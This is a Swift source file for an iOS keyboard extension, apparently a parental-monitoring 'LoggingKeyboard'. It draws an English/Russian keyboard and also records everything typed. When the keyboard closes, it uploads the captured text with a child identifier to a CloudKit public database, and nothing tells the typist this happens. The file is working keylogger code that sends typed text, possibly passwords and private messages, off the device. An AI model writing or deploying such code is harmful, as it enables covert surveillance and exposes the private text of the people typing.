//
//  KeyboardViewController.swift
//  LoggingKeyboard
//
//  Created by Michail Shagovitov on 15.01.2026.
//

import UIKit
import CloudKit

// Убедитесь, что этот файл добавлен в таргет клавиатуры
struct KeystrokeLog: Codable {
    let text: String
    let timestamp: Date
    let appBundleID: String?
}

class KeyboardViewController: UIInputViewController {
    
    enum KeyboardLanguage {
        case english
        case russian
    }
    
    private var keyboardLanguage: KeyboardLanguage = .english
    
    // --- Буфер для сбора текста ---
    private var textBuffer: String = ""
    
    // --- Доступ к CloudKit ---
    private let container = CKContainer(identifier: "iCloud.com.laborato.Parent")
    private var publicDatabase: CKDatabase { container.publicCloudDatabase }
    
    private var childID: String?
    
    // --- Состояние регистра ---
    private var isUppercase: Bool = false {
        didSet {
            updateKeyLabels()
        }
    }
    
    // --- Состояние caps lock ---
    private var isCapsLock: Bool = false
    
    // --- Режим клавиатуры ---
    private var keyboardMode: KeyboardMode = .letters {
        didSet {
            updateKeyboardLayout()
        }
    }
    
    enum KeyboardMode {
        case letters
        case numbers
        case symbols
    }
    
    // --- Основные стеки для UI ---
    private var mainStack: UIStackView!
    private var letterStacks: [UIStackView] = []
    
    // --- Ссылки на специальные кнопки ---
    private var shiftButton: UIButton!
    private var deleteButton: UIButton!
    private var switchModeButton: UIButton!
    private var languageModeButton: UIButton!
    
    // --- Буквы для разных режимов ---
    private var currentRows: [[String]] = [[]]
    
    private let englishLetterRows = [
        ["q", "w", "e", "r", "t", "y", "u", "i", "o", "p"],
        ["a", "s", "d", "f", "g", "h", "j", "k", "l"],
        ["z", "x", "c", "v", "b", "n", "m"]
    ]
    
    // Русская ЙЦУКЕН раскладка
    private let russianLetterRows = [
        ["й", "ц", "у", "к", "е", "н", "г", "ш", "щ", "з", "х", "ъ"],
        ["ф", "ы", "в", "а", "п", "р", "о", "л", "д", "ж", "э"],
        ["я", "ч", "с", "м", "и", "т", "ь", "б", "ю"]
    ]
    
    
    private let numberRows = [
        ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"],
        ["-", "/", ":", ";", "(", ")", "$", "&", "@", "\""],
        [".", ",", "?", "!", "'"]
    ]
    
    private let symbolRows = [
        ["[", "]", "{", "}", "#", "%", "^", "*", "+", "="],
        ["_", "\\", "|", "~", "<", ">", "€", "£", "¥", "•"],
        [".", ",", "?", "!", "'"]
    ]
    
    // --- Третий ряд для цифр/символов (статический) ---
    private let staticThirdRowForNumbers = ["#+=", ".", ",", "?", "!", "'", "⌫"]
    private let staticThirdRowForSymbols = ["123", ".", ",", "?", "!", "'", "⌫"]
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Получаем ID ребенка из AppGroup
        if let defaults = UserDefaults(suiteName: "group.com.laborato.test.Parent") {
            self.childID = defaults.string(forKey: "myChildRecordID")
        }
        
        // Восстанавливаем сохраненный язык из UserDefaults
        if let defaults = UserDefaults(suiteName: "group.com.laborato.test.Parent") {
            if let savedLanguage = defaults.string(forKey: "keyboardLanguage"),
               savedLanguage == "russian" {
                keyboardLanguage = .russian
            }
        }
        
        // Создаем и настраиваем UI клавиатуры
        setupKeyboardLayout()
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        updateKeyLabels()
    }
    
    // MARK: - Keyboard Setup
    
    private func setupKeyboardLayout() {
        // Основной стек
        mainStack = UIStackView()
        mainStack.axis = .vertical
        mainStack.spacing = 6
        mainStack.distribution = .fillEqually
        mainStack.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(mainStack)
        
        // Создаем ряды для буквенного режима
        createLetterRows()
        
        // Устанавливаем констрейнты
        NSLayoutConstraint.activate([
            mainStack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 4),
            mainStack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -4),
            mainStack.topAnchor.constraint(equalTo: view.topAnchor, constant: 6),
            mainStack.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -6)
        ])
        
        // Добавляем распознаватель жестов для Caps Lock на Shift
        let longPressShiftRecognizer = UILongPressGestureRecognizer(target: self, action: #selector(handleLongPressOnShift(_:)))
        longPressShiftRecognizer.minimumPressDuration = 0.5
        shiftButton.addGestureRecognizer(longPressShiftRecognizer)
        
        // Добавляем возможность автоповтора для Delete
        setupDeleteAutoRepeat()
    }
    
    private func createLetterRows() {
        // Очищаем предыдущие ряды
        letterStacks.forEach { $0.removeFromSuperview() }
        letterStacks.removeAll()
        
        mainStack.arrangedSubviews.forEach { $0.removeFromSuperview() }
        // Первый ряд (Q-P) - без изменений
        let firstRowStack = UIStackView()
        firstRowStack.axis = .horizontal
        firstRowStack.spacing = 4
        firstRowStack.distribution = .fillEqually
            
        switch keyboardLanguage {
        case .english: currentRows = englishLetterRows
        case .russian: currentRows = russianLetterRows
        }

        for key in currentRows[0] {
            let button = createKeyButton(title: key)
            firstRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(firstRowStack)
        mainStack.addArrangedSubview(firstRowStack)
        
        // Второй ряд (A-L) - добавляем небольшие отступы по бокам
        let secondRowStack = UIStackView()
        secondRowStack.axis = .horizontal
        secondRowStack.spacing = 4
        secondRowStack.distribution = .fillEqually
        
        if keyboardLanguage == .english {
            // Левый отступ
            let secondLeftSpacer = UIView()
            secondLeftSpacer.widthAnchor.constraint(equalToConstant: 10).isActive = true
            secondRowStack.addArrangedSubview(secondLeftSpacer)
        }
        
        for key in currentRows[1] {
            let button = createKeyButton(title: key)
            secondRowStack.addArrangedSubview(button)
        }
        
        if keyboardLanguage == .english {
            // Правый отступ
            let secondRightSpacer = UIView()
            secondRightSpacer.widthAnchor.constraint(equalToConstant: 10).isActive = true
            secondRowStack.addArrangedSubview(secondRightSpacer)
        }
        
        letterStacks.append(secondRowStack)
        mainStack.addArrangedSubview(secondRowStack)
        
        // ТРЕТИЙ РЯД - с Shift слева и Delete справа
        let thirdRowStack = UIStackView()
        thirdRowStack.axis = .horizontal
        thirdRowStack.spacing = 4
        thirdRowStack.distribution = .fillEqually
        
        // 1. КНОПКА SHIFT СЛЕВА
        shiftButton = createSpecialButton(title: "⇧", action: #selector(didTapShift))
        thirdRowStack.addArrangedSubview(shiftButton)
        
        // 2. БУКВЫ Z-M (7 букв)
        for key in currentRows[2] {
            let button = createKeyButton(title: key)
            thirdRowStack.addArrangedSubview(button)
        }
        
        // 3. КНОПКА DELETE СПРАВА
        deleteButton = createSpecialButton(title: "⌫", action: #selector(didTapDelete))
        thirdRowStack.addArrangedSubview(deleteButton)
        
        letterStacks.append(thirdRowStack)
        mainStack.addArrangedSubview(thirdRowStack)
        
        // ЧЕТВЕРТЫЙ РЯД - специальные кнопки
        let fourthRowStack = UIStackView()
        fourthRowStack.axis = .horizontal
        fourthRowStack.spacing = 4
        fourthRowStack.distribution = .fill
        
        languageModeButton = createSpecialButton(title: keyboardLanguage == .english ? "Рус" : "Eng", action: #selector(didTapSwitchLanguage))
        languageModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        fourthRowStack.addArrangedSubview(languageModeButton)
        
        // 1. Кнопка переключения режима слева
        switchModeButton = createSpecialButton(title: "123", action: #selector(didTapSwitchMode))
        switchModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        fourthRowStack.addArrangedSubview(switchModeButton)
        
        // 2. Кнопка пробела (растягивается на всю доступную ширину)
        let spaceButton = createSpecialButton(title: "space", action: #selector(didTapSpace))
        
        // 3. Кнопка отправки
        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapEnter))
        sendButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        
        fourthRowStack.addArrangedSubview(spaceButton)
        fourthRowStack.addArrangedSubview(sendButton)
        
        // Настраиваем приоритеты для растягивания пробела
        spaceButton.setContentHuggingPriority(.defaultLow, for: .horizontal)
        spaceButton.setContentCompressionResistancePriority(.defaultLow, for: .horizontal)
        sendButton.setContentHuggingPriority(.defaultHigh, for: .horizontal)
        switchModeButton.setContentHuggingPriority(.defaultHigh, for: .horizontal)
        
        mainStack.addArrangedSubview(fourthRowStack)
    }
    
    private func createNumberRows() {
        // Очищаем предыдущие ряды
        letterStacks.forEach { $0.removeFromSuperview() }
        letterStacks.removeAll()
        
        mainStack.arrangedSubviews.forEach { $0.removeFromSuperview() }
        
        // Первый ряд цифр
        let firstRowStack = UIStackView()
        firstRowStack.axis = .horizontal
        firstRowStack.spacing = 4
        firstRowStack.distribution = .fillEqually
        
        for key in numberRows[0] {
            let button = createKeyButton(title: key)
            firstRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(firstRowStack)
        mainStack.addArrangedSubview(firstRowStack)
        
        // Второй ряд символов
        let secondRowStack = UIStackView()
        secondRowStack.axis = .horizontal
        secondRowStack.spacing = 4
        secondRowStack.distribution = .fillEqually
        
        for key in numberRows[1] {
            let button = createKeyButton(title: key)
            secondRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(secondRowStack)
        mainStack.addArrangedSubview(secondRowStack)
        
        // ТРЕТИЙ РЯД - статический для цифр/символов
        let thirdRowStack = UIStackView()
        thirdRowStack.axis = .horizontal
        thirdRowStack.spacing = 4
        thirdRowStack.distribution = .fillEqually
        
        for (index, key) in staticThirdRowForNumbers.enumerated() {
            let button: UIButton
            if index == 0 {
                button = createSpecialButton(title: key, action: #selector(didTapSwitchToSymbols))
            } else if index == staticThirdRowForNumbers.count - 1 {
                button = createSpecialButton(title: key, action: #selector(didTapDelete))
                self.deleteButton = button
            } else {
                button = createKeyButton(title: key)
            }
            thirdRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(thirdRowStack)
        mainStack.addArrangedSubview(thirdRowStack)
        
        let fourthRowStack = UIStackView()
        fourthRowStack.axis = .horizontal
        fourthRowStack.spacing = 4
        fourthRowStack.distribution = .fill
        
        let languageModeButton = createSpecialButton(title: keyboardLanguage == .english ? "Рус" : "Eng", action: #selector(didTapSwitchLanguage))
        languageModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        fourthRowStack.addArrangedSubview(languageModeButton)
        
        let switchToLettersButton = createSpecialButton(title: "ABC", action: #selector(didTapSwitchToLetters))
        switchToLettersButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        fourthRowStack.addArrangedSubview(switchToLettersButton)
        
        let spaceButton = createSpecialButton(title: "space", action: #selector(didTapSpace))
        
        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapEnter))
        sendButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        
        fourthRowStack.addArrangedSubview(spaceButton)
        fourthRowStack.addArrangedSubview(sendButton)
        
        spaceButton.setContentHuggingPriority(.defaultLow, for: .horizontal)
        spaceButton.setContentCompressionResistancePriority(.defaultLow, for: .horizontal)
        sendButton.setContentHuggingPriority(.defaultHigh, for: .horizontal)
        switchToLettersButton.setContentHuggingPriority(.defaultHigh, for: .horizontal)
        
        mainStack.addArrangedSubview(fourthRowStack)
    }
    
    private func createSymbolRows() {
        letterStacks.forEach { $0.removeFromSuperview() }
        letterStacks.removeAll()
        
        mainStack.arrangedSubviews.forEach { $0.removeFromSuperview() }
        
        let firstRowStack = UIStackView()
        firstRowStack.axis = .horizontal
        firstRowStack.spacing = 4
        firstRowStack.distribution = .fillEqually
        
        for key in symbolRows[0] {
            let button = createKeyButton(title: key)
            firstRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(firstRowStack)
        mainStack.addArrangedSubview(firstRowStack)
        
        let secondRowStack = UIStackView()
        secondRowStack.axis = .horizontal
        secondRowStack.spacing = 4
        secondRowStack.distribution = .fillEqually
        
        for key in symbolRows[1] {
            let button = createKeyButton(title: key)
            secondRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(secondRowStack)
        mainStack.addArrangedSubview(secondRowStack)
        
        // ТРЕТИЙ РЯД - статический для символов
        let thirdRowStack = UIStackView()
        thirdRowStack.axis = .horizontal
        thirdRowStack.spacing = 4
        thirdRowStack.distribution = .fillEqually
        
        for (index, key) in staticThirdRowForSymbols.enumerated() {
            let button: UIButton
            if index == 0 {
                button = createSpecialButton(title: key, action: #selector(didTapSwitchToNumbers))
            } else if index == staticThirdRowForSymbols.count - 1 {
                button = createSpecialButton(title: key, action: #selector(didTapDelete))
                self.deleteButton = button
            } else {
                button = createKeyButton(title: key)
            }
            thirdRowStack.addArrangedSubview(button)
        }
        
        letterStacks.append(thirdRowStack)
        mainStack.addArrangedSubview(thirdRowStack)
        
        // Четвертый ряд (аналогичный буквенному режиму)
        let fourthRowStack = UIStackView()
        fourthRowStack.axis = .horizontal
        fourthRowStack.spacing = 4
        fourthRowStack.distribution = .fill
        
        let languageModeButton = createSpecialButton(title: keyboardLanguage == .english ? "Рус" : "Eng", action: #selector(didTapSwitchLanguage))
        languageModeButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        fourthRowStack.addArrangedSubview(languageModeButton)
        
        // Кнопка переключения на буквы
        let switchToLettersButton = createSpecialButton(title: "ABC", action: #selector(didTapSwitchToLetters))
        switchToLettersButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        fourthRowStack.addArrangedSubview(switchToLettersButton)
        
        // Кнопка пробела
        let spaceButton = createSpecialButton(title: "space", action: #selector(didTapSpace))
        
        // Кнопка отправки
        let sendButton = createSpecialButton(title: "⏎", action: #selector(didTapEnter))
        sendButton.widthAnchor.constraint(equalToConstant: 60).isActive = true
        
        fourthRowStack.addArrangedSubview(spaceButton)
        fourthRowStack.addArrangedSubview(sendButton)
        
        // Настраиваем приоритеты
        spaceButton.setContentHuggingPriority(.defaultLow, for: .horizontal)
        spaceButton.setContentCompressionResistancePriority(.defaultLow, for: .horizontal)
        sendButton.setContentHuggingPriority(.defaultHigh, for: .horizontal)
        switchToLettersButton.setContentHuggingPriority(.defaultHigh, for: .horizontal)
        
        mainStack.addArrangedSubview(fourthRowStack)
    }
    
    private func updateKeyboardLayout() {
        switch keyboardMode {
        case .letters:
            switchModeButton.setTitle("123", for: .normal)
            createLetterRows()
        case .numbers:
            switchModeButton.setTitle("ABC", for: .normal)
            createNumberRows()
        case .symbols:
            switchModeButton.setTitle("123", for: .normal)
            createSymbolRows()
        }
        
        setupDeleteAutoRepeat()
        
        if keyboardMode == .letters {
            updateShiftButtonAppearance()
        }
    }
    
    private func setupDeleteAutoRepeat() {
        deleteButton?.gestureRecognizers?.forEach { deleteButton.removeGestureRecognizer($0) }
        
        let longPressDelete = UILongPressGestureRecognizer(target: self, action: #selector(handleLongPressOnDelete(_:)))
        longPressDelete.minimumPressDuration = 0.5
        deleteButton?.addGestureRecognizer(longPressDelete)
    }
    
    @objc private func handleLongPressOnDelete(_ gesture: UILongPressGestureRecognizer) {
        switch gesture.state {
        case .began:
            startDeleteAutoRepeat()
        case .ended, .cancelled:
            stopDeleteAutoRepeat()
        default:
            break
        }
    }
    
    private var deleteTimer: Timer?
    
    private func startDeleteAutoRepeat() {
        performDelete()
        
        deleteTimer = Timer.scheduledTimer(withTimeInterval: 0.1, repeats: true) { [weak self] _ in
            self?.performDelete()
        }
    }
    
    private func stopDeleteAutoRepeat() {
        deleteTimer?.invalidate()
        deleteTimer = nil
    }
    
    private func performDelete() {
        textDocumentProxy.deleteBackward()
        if !textBuffer.isEmpty {
            textBuffer.removeLast()
        }
    }
    
    // MARK: - Button Creation
    
    private func createKeyButton(title: String) -> UIButton {
        let button = UIButton(type: .system)
        button.setTitle(title, for: .normal)
        button.titleLabel?.font = .systemFont(ofSize: 20, weight: .regular)
        button.backgroundColor = .white
        button.setTitleColor(.black, for: .normal)
        button.layer.cornerRadius = 5
        button.layer.shadowColor = UIColor.black.cgColor
        button.layer.shadowOpacity = 0.2
        button.layer.shadowOffset = CGSize(width: 0, height: 1)
        button.layer.shadowRadius = 1
        button.translatesAutoresizingMaskIntoConstraints = false
        button.heightAnchor.constraint(equalToConstant: 45).isActive = true
        button.addTarget(self, action: #selector(didTapKey(_:)), for: .touchUpInside)
        
        // Эффект нажатия
        button.addTarget(self, action: #selector(keyTouchDown(_:)), for: .touchDown)
        button.addTarget(self, action: #selector(keyTouchUp(_:)), for: [.touchUpInside, .touchUpOutside, .touchCancel])
        
        return button
    }
    
    private func createSpecialButton(title: String, action: Selector) -> UIButton {
        let button = UIButton(type: .system)
        button.setTitle(title, for: .normal)
        button.titleLabel?.font = .systemFont(ofSize: 16, weight: .medium)
        button.backgroundColor = UIColor.systemGray5
        button.setTitleColor(.black, for: .normal)
        button.layer.cornerRadius = 5
        button.layer.shadowColor = UIColor.black.cgColor
        button.layer.shadowOpacity = 0.2
        button.layer.shadowOffset = CGSize(width: 0, height: 1)
        button.layer.shadowRadius = 1
        button.translatesAutoresizingMaskIntoConstraints = false
        button.heightAnchor.constraint(equalToConstant: 45).isActive = true
        button.addTarget(self, action: action, for: .touchUpInside)
        
        button.addTarget(self, action: #selector(specialKeyTouchDown(_:)), for: .touchDown)
        button.addTarget(self, action: #selector(specialKeyTouchUp(_:)), for: [.touchUpInside, .touchUpOutside, .touchCancel])
        
        return button
    }
    
    // MARK: - Key Actions
    
    @objc private func keyTouchDown(_ sender: UIButton) {
        UIView.animate(withDuration: 0.1) {
            sender.backgroundColor = UIColor.lightGray
            sender.transform = CGAffineTransform(scaleX: 0.95, y: 0.95)
        }
    }
    
    @objc private func keyTouchUp(_ sender: UIButton) {
        UIView.animate(withDuration: 0.1) {
            sender.backgroundColor = .white
            sender.transform = .identity
        }
    }
    
    @objc private func specialKeyTouchDown(_ sender: UIButton) {
        UIView.animate(withDuration: 0.1) {
            sender.backgroundColor = UIColor.systemGray3
            sender.transform = CGAffineTransform(scaleX: 0.95, y: 0.95)
        }
    }
    
    @objc private func specialKeyTouchUp(_ sender: UIButton) {
        UIView.animate(withDuration: 0.1) {
            sender.backgroundColor = UIColor.systemGray5
            sender.transform = .identity
        }
    }
    
    @objc func didTapKey(_ sender: UIButton) {
        guard let char = sender.title(for: .normal) else { return }
        textDocumentProxy.insertText(char)
        textBuffer.append(char)
        
        if keyboardMode == .letters && !isCapsLock && isUppercase {
            isUppercase = false
            updateShiftButtonAppearance()
        }
    }
    
    @objc func didTapShift() {
        if keyboardMode != .letters { return }
        
        if isCapsLock {
            isCapsLock = false
            isUppercase = false
        } else {
            isUppercase.toggle()
        }
        updateShiftButtonAppearance()
    }
    
    @objc func handleLongPressOnShift(_ gesture: UILongPressGestureRecognizer) {
        if keyboardMode != .letters { return }
        
        guard gesture.state == .began else { return }
        
        isCapsLock = true
        isUppercase = true
        updateShiftButtonAppearance()
        
        let generator = UIImpactFeedbackGenerator(style: .medium)
        generator.impactOccurred()
    }
    
    @objc func didTapSwitchMode() {
        switch keyboardMode {
        case .letters:
            keyboardMode = .numbers
        case .numbers:
            keyboardMode = .letters
        case .symbols:
            keyboardMode = .letters
        }
    }
    
    @objc func didTapSwitchToSymbols() {
        keyboardMode = .symbols
    }
    
    @objc func didTapSwitchToNumbers() {
        keyboardMode = .numbers
    }
    
    @objc func didTapSwitchToLetters() {
        keyboardMode = .letters
    }
    
    private func updateShiftButtonAppearance() {
        guard let shiftButton = shiftButton else { return }
        
        if isCapsLock {
            shiftButton.backgroundColor = UIColor.systemBlue
            shiftButton.setTitleColor(.white, for: .normal)
        } else if isUppercase {
            shiftButton.backgroundColor = UIColor.darkGray
            shiftButton.setTitleColor(.white, for: .normal)
        } else {
            shiftButton.backgroundColor = UIColor.systemGray5
            shiftButton.setTitleColor(.black, for: .normal)
        }
    }
    
    @objc func didTapDelete() {
        performDelete()
    }
    
    @objc func didTapSpace() {
        textDocumentProxy.insertText(" ")
        textBuffer.append(" ")
    }
    
    @objc func didTapEnter() {
        textDocumentProxy.insertText("\n")
    }
    
    func didTapSend() {
        print("▶️ Отправляем данные при скрытии клавиатуры.")
        
        textDocumentProxy.insertText("\n")
        
        guard hasFullAccess, !textBuffer.isEmpty, let childID = self.childID else {
            if !hasFullAccess { print("⚠️ Нет полного доступа для отправки.") }
            if textBuffer.isEmpty { print("ℹ️ Буфер пуст, нечего отправлять.") }
            if childID == nil { print("❌ Нет ID ребенка для отправки.") }
            return
        }
        
        let textToSend = self.textBuffer
        self.textBuffer = ""
        
        let log = KeystrokeLog(
            text: textToSend,
            timestamp: Date(),
            appBundleID: "Непонятно как достать тут место, где печатался текст" //textDocumentProxy.documentContextBeforeInput
        )
        
        Task {
            do {
                try await saveLogToCloudKit(log, for: childID)
                print("✅ Клавиатура: Лог успешно отправлен.")
            } catch {
                print("❌ Клавиатура: Ошибка отправки лога: \(error)")
                self.textBuffer = textToSend + self.textBuffer
            }
        }
    }
    
    // MARK: - Helper Methods
    
    private func updateKeyLabels() {
        guard keyboardMode == .letters else { return }
        
        for (rowIndex, rowStack) in letterStacks.enumerated() {
            if rowIndex == 2 {
                let startIndex = 1
                let endIndex = rowStack.arrangedSubviews.count - 1
                
                for index in startIndex..<endIndex {
                    guard index - 1 < currentRows[2].count else { continue }
                    guard let button = rowStack.arrangedSubviews[index] as? UIButton else { continue }
                    
                    let originalTitle = currentRows[2][index - 1]
                    let newTitle = isUppercase ? originalTitle.uppercased() : originalTitle.lowercased()
                    button.setTitle(newTitle, for: .normal)
                }
            } else {
                for (keyIndex, view) in rowStack.arrangedSubviews.enumerated() {
                    guard let button = view as? UIButton else { continue }
                    
                    let adjustedIndex: Int
                    if rowIndex == 1 {
                        adjustedIndex = keyIndex - 1
                    } else {
                        adjustedIndex = keyIndex
                    }
                    
                    guard adjustedIndex >= 0 && adjustedIndex < currentRows[rowIndex].count else { continue }
                    
                    let originalTitle = currentRows[rowIndex][adjustedIndex]
                    let newTitle = isUppercase ? originalTitle.uppercased() : originalTitle.lowercased()
                    button.setTitle(newTitle, for: .normal)
                }
            }
        }
        
        updateShiftButtonAppearance()
    }
    
    // MARK: - CloudKit Methods
    
    private func saveLogToCloudKit(_ log: KeystrokeLog, for childID: String) async throws {
        let record = CKRecord(recordType: "KeystrokeLog")
        
        record["text"] = log.text as CKRecordValue
        record["timestamp"] = log.timestamp as CKRecordValue
        record["targetChildID"] = childID as CKRecordValue
        if let bundleID = log.appBundleID {
            record["appBundleID"] = bundleID as CKRecordValue
        }
        
        try await publicDatabase.save(record)
    }
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        stopDeleteAutoRepeat()
        didTapSend()
    }
    
    deinit {
        stopDeleteAutoRepeat()
    }
    
    @objc func didTapSwitchLanguage() {
        // Переключаем язык
        keyboardLanguage = (keyboardLanguage == .english) ? .russian : .english
        
        // Сохраняем выбор языка в UserDefaults
        if let defaults = UserDefaults(suiteName: "group.com.laborato.test.Parent") {
            let languageString = keyboardLanguage == .english ? "english" : "russian"
            defaults.set(languageString, forKey: "keyboardLanguage")
            defaults.synchronize()
        }
        
        // Обновляем раскладку
        updateKeyboardLayout()
        
        // Вибрация для обратной связи
        let generator = UIImpactFeedbackGenerator(style: .light)
        generator.impactOccurred()
    }
}
